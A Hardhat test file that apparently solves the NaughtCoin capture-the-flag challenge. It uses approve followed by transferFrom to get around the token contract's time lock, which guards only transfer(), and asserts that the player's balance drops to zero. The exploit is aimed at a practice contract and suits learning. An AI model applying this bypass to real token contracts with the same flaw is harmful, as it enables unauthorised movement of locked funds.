
import { expect } from "chai";
import { BigNumber } from "ethers";
import { deployments, ethers, getNamedAccounts} from "hardhat";
import "hardhat-deploy-ethers";

describe("NaughtCoinExploit", async () =>{

  it("Break Time Lock", async () =>{
    await deployments.fixture(["NaughtCoin"])
    const {exploiter}= await getNamedAccounts()
    const exploiterAcc=await ethers.getSigner(exploiter)
    const naughtCoinDeployment=await deployments.get('NaughtCoin')
    
    const naughtCoin = await ethers.getContractAt('NaughtCoin',naughtCoinDeployment.address)
    
    expect(await naughtCoin.player(),"Wrong player account").to.be.equal(exploiter)
    const exploiterBalance=await naughtCoin.balanceOf(exploiter)
    //console.log("Successful balance")
    await naughtCoin.connect(exploiterAcc).approve(exploiter, exploiterBalance)
    //console.log("Successful approve")
    const deadAddress="0xdF3e18d64BC6A983f673Ab319CCaE4f1a57C7097"

    await naughtCoin.connect(exploiterAcc).transferFrom(exploiter, deadAddress ,exploiterBalance)

    //console.log("Successful transfer from")

    expect((await naughtCoin.balanceOf(exploiter)).eq(0),"Unsuccesful exploit").to.be.true

  });
});
